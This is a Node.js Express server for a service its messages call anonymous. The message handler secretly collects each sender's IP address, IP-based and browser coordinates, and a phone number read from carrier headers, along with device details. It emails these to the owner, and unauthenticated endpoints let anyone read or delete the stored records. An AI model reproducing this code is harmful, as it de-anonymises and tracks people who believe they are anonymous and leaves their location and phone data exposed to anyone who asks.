const express = require('express');
const cors = require('cors');
const fs = require('fs').promises;
const path = require('path');
const axios = require('axios');
const crypto = require('crypto');
const UAParser = require('ua-parser-js');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 3000;

// Trust proxy so req.ip reflects x-forwarded-for on Render/Cloudflare/etc.
app.set('trust proxy', true);

// CORS: allow all for now; optionally restrict to your frontend origin
app.use(cors());
app.use(express.json());

const MESSAGES_FILE = path.join(__dirname, 'messages.json');

// Email configuration (set via environment variables in deployment)
// Required for SMTP: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS
// Optional: FROM_EMAIL (defaults to SMTP_USER), TO_EMAIL (defaults to provided owner email)
const EMAIL_TO_DEFAULT = 'isumuthsara2003@gmail.com';
let mailTransporter = null;
try {
  const { SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS } = process.env;
  if (SMTP_HOST && SMTP_PORT && SMTP_USER && SMTP_PASS) {
    mailTransporter = nodemailer.createTransport({
      host: SMTP_HOST,
      port: Number(SMTP_PORT),
      secure: Number(SMTP_PORT) === 465,
      auth: { user: SMTP_USER, pass: SMTP_PASS }
    });
  } else {
    console.log('Email not configured: set SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS.');
  }
} catch (e) {
  console.log('Email transporter setup failed:', e.message);
}

// In-memory state store for OAuth flow (stateless deployments will reset on restart)
const oauthStateStore = new Map();

function createState() {
  const state = crypto.randomBytes(16).toString('hex');
  oauthStateStore.set(state, Date.now());
  return state;
}

function validateAndDeleteState(state) {
  const created = oauthStateStore.get(state);
  if (!created) return false;
  // 10 minute validity
  if (Date.now() - created > 10 * 60 * 1000) {
    oauthStateStore.delete(state);
    return false;
  }
  oauthStateStore.delete(state);
  return true;
}

// Get all messages
app.get('/messages', async (req, res) => {
  try {
    const data = await fs.readFile(MESSAGES_FILE, 'utf8');
    const messages = JSON.parse(data);
    res.json(messages);
  } catch (error) {
    res.status(500).json({ error: 'Failed to read messages' });
  }
});

// Post a new message
app.post('/message', async (req, res) => {
  try {
    const { message } = req.body;
    
    if (!message || message.trim() === '') {
      return res.status(400).json({ error: 'Message content is required' });
    }

    const data = await fs.readFile(MESSAGES_FILE, 'utf8');
    const messages = JSON.parse(data);
    
    // Get sender's IP address (handle proxies: x-forwarded-for can be a list)
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    if (typeof ip === 'string' && ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }
    // Normalize IPv6 localhost
    if (ip === '::1') ip = '127.0.0.1';
    
    // Get location from IP (using free ip-api.com service)
    let location = 'Unknown';
    let coordinates = null;
    try {
      if (ip && ip !== '::1' && ip !== '127.0.0.1' && ip !== 'Unknown') {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        if (response.data && response.data.status === 'success') {
          location = `${response.data.city}, ${response.data.country}`;
          // Extract precise coordinates from IP geolocation
          if (response.data.lat && response.data.lon) {
            coordinates = {
              latitude: response.data.lat,
              longitude: response.data.lon,
              accuracy: 5000 // ~5km accuracy for IP-based geolocation
            };
          }
        }
      } else {
        location = 'Local/Localhost';
      }
    } catch (error) {
      console.error('Geolocation error:', error.message);
      location = 'Unknown';
    }
    
    // Prefer client-provided precise coordinates (from browser permission)
    const clientCoordinates = req.body.coordinates || null;

    // Attempt to capture phone number from carrier-provided headers (rare; not reliable)
    const msisdnHeaderCandidates = [
      'x-msisdn',
      'x-up-calling-line-id',
      'x-wap-msisdn',
      'x-hutch-msisdn',
      'x-source-msisdn',
      'x-network-info'
    ];
    let phoneAuto = null;
    for (const key of msisdnHeaderCandidates) {
      const raw = req.headers[key];
      if (typeof raw === 'string' && raw.trim()) {
        const sanitized = raw.replace(/[^\d+]/g, '');
        if (sanitized.replace(/\D/g, '').length >= 7) {
          phoneAuto = sanitized;
          break;
        }
      }
    }
    if (phoneAuto) {
      console.log('Captured phone from header:', phoneAuto);
    } else {
      console.log('No MSISDN headers found; headers present:', Object.keys(req.headers));
    }
    
    // Parse User Agent for browser, OS, device type
    const ua = req.headers['user-agent'] || 'Unknown';
    const parser = new UAParser(ua);
    const uaParsed = parser.getResult();
    
    // Capture referrer and language
    const referrer = req.headers['referer'] || 'Direct';
    const language = (req.headers['accept-language'] || 'Unknown').split(',')[0].trim();
    
    const newMessage = {
      id: Date.now(),
      message: message.trim(),
      timestamp: new Date().toISOString(),
      ip,
      location: location,
      coordinates: clientCoordinates || coordinates,
      userAgent: {
        browser: uaParsed.browser.name || 'Unknown',
        browserVersion: uaParsed.browser.version || 'Unknown',
        os: uaParsed.os.name || 'Unknown',
        osVersion: uaParsed.os.version || 'Unknown',
        deviceType: uaParsed.device.type || 'Desktop'
      },
      referrer,
      language
    };
    if (phoneAuto) {
      newMessage.phone = phoneAuto;
    }
    
    messages.push(newMessage);
    
    await fs.writeFile(MESSAGES_FILE, JSON.stringify(messages, null, 2));

    // Send email notification (non-blocking; errors won't affect response)
    (async () => {
      if (!mailTransporter) return;
      const fromEmail = process.env.FROM_EMAIL || process.env.SMTP_USER || 'no-reply@example.com';
      const toEmail = process.env.TO_EMAIL || EMAIL_TO_DEFAULT;

      const subject = `New Anonymous Message (#${newMessage.id})`;
      const coord = newMessage.coordinates || {};
      const ua = newMessage.userAgent || {};
      const bodyText = [
        `Message: ${newMessage.message}`,
        `Timestamp (UTC): ${newMessage.timestamp}`,
        `IP: ${newMessage.ip}`,
        `Location: ${newMessage.location}`,
        `Coordinates: ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)`,
        `Browser: ${ua.browser} ${ua.browserVersion}`,
        `OS: ${ua.os} ${ua.osVersion}`,
        `Device: ${ua.deviceType}`,
        `Referrer: ${newMessage.referrer}`,
        `Language: ${newMessage.language}`,
        newMessage.phone ? `Phone (header): ${newMessage.phone}` : null
      ].filter(Boolean).join('\n');

      try {
        await mailTransporter.sendMail({
          from: fromEmail,
          to: toEmail,
          subject,
          text: bodyText
        });
        console.log('Email notification sent to', toEmail);
      } catch (err) {
        console.error('Failed to send email notification:', err.message);
      }
    })();

    res.status(201).json(newMessage);
  } catch (error) {
    res.status(500).json({ error: 'Failed to save message' });
  }
});

// Delete a message
app.delete('/message/:id', async (req, res) => {
  try {
    const messageId = parseInt(req.params.id);
    const data = await fs.readFile(MESSAGES_FILE, 'utf8');
    let messages = JSON.parse(data);
    
    messages = messages.filter(msg => msg.id !== messageId);
    
    await fs.writeFile(MESSAGES_FILE, JSON.stringify(messages, null, 2));
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete message' });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
